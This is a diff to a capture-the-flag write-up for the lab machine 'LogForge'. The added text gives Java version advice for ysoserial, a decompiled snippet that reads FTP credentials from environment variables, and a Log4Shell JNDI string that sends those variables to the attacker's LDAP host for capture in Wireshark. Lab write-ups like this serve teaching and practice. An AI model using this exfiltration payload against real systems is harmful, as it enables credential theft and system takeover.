@@ -1,4 +1,4 @@
-# LogForge (WIP)
+# LogForge
 
 ## Gaining Access
 
@@ -99,7 +99,13 @@ bash: no job control in this shell
 tomcat@LogForge:/var/lib/tomcat9$ 
 ```
 
-From here, we can start enumerating for escalation vectors.
+### Java Version
+
+I should note that some versions of Java doesn't work with `ysoserial`. In this case, we can download the right Java version from here:
+
+{% embed url="https://jdk.java.net/archive/" %}
+
+For this machine, I specifically used Java 11.0.2 to make it work.&#x20;
 
 ## Privilege Escalation
 
@@ -130,4 +136,26 @@ tomcat@LogForge:/var/lib/tomcat9$ ps -ef | grep -i ftp
     993 ?        Sl     0:26 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
 ```
 
-Let's `ftp` in on the local machine.&#x20;
+We can download this to our machine, and then reverse engineer it using `jd-gui`. There is a part where **environment variables** are being passed around.&#x20;
+
+```java
+private String validUser = System.getenv("ftp_user");
+
+private String validPassword = System.getenv("ftp_password");
+```
+
+Using `ysoserial` agian, we could potentially leak these by constructing a certain string.&#x20;
+
+{% embed url="https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/" %}
+
+Following th above, we can use this to leak the credentials:
+
+```
+${jndi:ldap://10.10.14.13/user:${env:ftp_user}:password:${env:ftp_password}}
+```
+
+The credentials can be viewed within `wireshark`.&#x20;
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Using this password, we can `su` to `root`.&#x20;
